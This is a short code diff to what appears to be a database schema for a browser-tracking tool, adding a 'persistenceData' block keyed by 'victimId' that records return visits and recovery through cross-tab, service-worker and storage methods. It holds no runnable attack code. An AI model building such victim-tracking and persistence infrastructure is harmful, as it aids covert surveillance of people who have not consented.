@@ -139,7 +139,20 @@ permissions: {
   ambientLight: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
   proximity: { status: { type: String, enum: ['unknown', 'granted', 'denied', 'pending'], default: 'unknown' }, lastUpdated: Date },
   lastUpdated: Date
-}
+},
+
+// Persistence tracking
+persistenceData: {
+  victimId: { type: String },
+  revisitCount: { type: Number, default: 0 },
+  firstVisit: { type: Date },
+  lastVisit: { type: Date },
+  returnVisitor: { type: Boolean, default: false },
+  crossTabRecovered: { type: Boolean, default: false },
+  swRecovered: { type: Boolean, default: false },
+  storageRecovered: { type: Boolean, default: false },
+  persistenceMethods: [{ type: String }]
+},
 
 }, { timestamps: true });
 
